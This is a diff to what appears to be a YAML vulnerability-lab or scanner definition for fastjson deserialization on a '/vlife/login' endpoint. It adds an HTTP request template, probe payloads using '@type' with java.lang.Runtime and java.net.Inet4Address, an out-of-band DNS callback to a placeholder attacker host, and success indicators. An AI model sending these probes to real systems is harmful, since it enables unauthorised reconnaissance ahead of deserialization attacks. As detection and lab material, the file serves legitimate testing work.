@@ -39,6 +39,32 @@ vulnerabilities:
     authentication:
       type: none
       required: false
+    request: |
+      POST /vlife/login HTTP/1.1
+      Host: {{target}}
+      Content-Type: application/json
+
+      {"@type":"java.net.Inet4Address","val":"{{callback}}"}
+    response: |
+      HTTP/1.1 200 OK
+      Content-Type: application/json
+
+      {"message":"com.alibaba.fastjson.JSONException: autoType is not support. java.net.Inet4Address"}
+    payloads:
+      - name: "Error-based detection"
+        value: '{"@type":"java.lang.Runtime"}'
+        note: "Triggers autoType error confirming fastjson deserialization"
+      - name: "OOB DNS callback"
+        value: '{"@type":"java.net.Inet4Address","val":"CALLBACK_HOST"}'
+        note: "Triggers DNS resolution to attacker-controlled host"
+    indicators:
+      success:
+        - "com.alibaba.fastjson.JSONException"
+        - "autoType is not support"
+        - "java.lang.Runtime"
+      failure:
+        - "Invalid credentials"
+        - "Bad Request"
 
 technical: |
   Root Cause:
@@ -103,6 +129,5 @@ poc:
 
 providers:
   docker-compose:
-    path: "docker-compose.yaml"  
+    path: "docker-compose.yaml"
     port: 8288
-
